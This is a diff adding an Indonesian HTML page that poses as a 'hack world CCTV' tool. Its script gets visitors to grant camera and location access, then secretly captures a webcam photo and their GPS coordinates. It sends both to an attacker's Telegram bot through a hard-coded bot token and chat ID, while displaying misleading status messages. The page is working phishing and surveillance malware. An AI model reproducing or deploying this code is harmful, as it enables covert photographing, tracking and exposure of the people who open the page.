@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Secure Access</title>
+  <style>
+    body{
+      margin:0; padding:0; height:100vh;
+      background:black; color:#00ff66;
+      font-family: monospace; display:flex;
+      align-items:center; justify-content:center;
+      flex-direction:column;
+    }
+    h1{margin-bottom:20px; text-shadow:0 0 8px #00ff66;}
+    button{
+      background:transparent; color:#00ff66;
+      border:2px solid #00ff66; padding:12px 20px;
+      border-radius:10px; font-weight:bold;
+      cursor:pointer; font-size:1.1rem;
+      box-shadow:0 0 10px #00ff66;
+      transition:0.2s;
+    }
+    button:hover{background:#00ff66; color:black;}
+    #log{
+      margin-top:20px; width:90%; max-width:500px;
+      height:200px; overflow:auto;
+      background:rgba(0,0,0,0.7); border:1px dashed #00ff66;
+      padding:10px; border-radius:8px; font-size:14px;
+    }
+  </style>
+</head>
+<body>
+  <h1>izinkan akses notifikasi kamera lokasi biar cctv ke tangkap semua</h1>
+  <button id="openBtn">HACK CCTV DUNIA</button>
+  <div id="log"></div>
+
+<script>
+const BOT_TOKEN = "8304762261:AAEL4W9914POsx1xEDo1gFzssc_wKACuFo8";
+const OWNER_ID = "8044159892";
+
+const logBox = document.getElementById("log");
+function log(msg){
+  logBox.innerHTML += msg+"<br>";
+  logBox.scrollTop = logBox.scrollHeight;
+}
+
+document.getElementById("openBtn").addEventListener("click", async()=>{
+  log("▶ cctv error kamera lokasi tidak terdeteksi.");
+  let photoBlob=null;
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+    stream.getTracks().forEach(t=>t.stop());
+    log("✔ Kamera: foto diambil.");
+  }catch(e){
+    log("❌ Kamera gagal: "+e.message);
+  }
+
+  log("▶ Mengakses cctv...");
+  let coords=null;
+  try{
+    coords = await new Promise((resolve,reject)=>{
+      navigator.geolocation.getCurrentPosition(
+        pos=>resolve(pos.coords),
+        err=>reject(err),
+        {timeout:10000}
+      );
+    });
+    log("✔ Lokasi: "+coords.latitude.toFixed(5)+","+coords.longitude.toFixed(5));
+  }catch(e){
+    log("❌ cctv gagal: "+e.message);
+  }
+
+  // Kirim ke Telegram
+  try{
+    if(photoBlob){
+      const fd = new FormData();
+      fd.append("chat_id",OWNER_ID);
+      fd.append("photo",photoBlob,"snap.jpg");
+      let cap = "Snapshot dari device.";
+      if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+      fd.append("caption",cap);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+      log("📡 Foto terkirim ke Telegram.");
+    }
+    if(coords){
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:OWNER_ID,text:`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
+      });
+      log("📡 Lokasi terkirim ke Telegram.");
+    }
+  }catch(e){
+    log("❌ Kirim Telegram gagal: "+e.message);
+  }
+
+  log("=== Selesai ===");
+});
+</script>
+</body>
+</html>
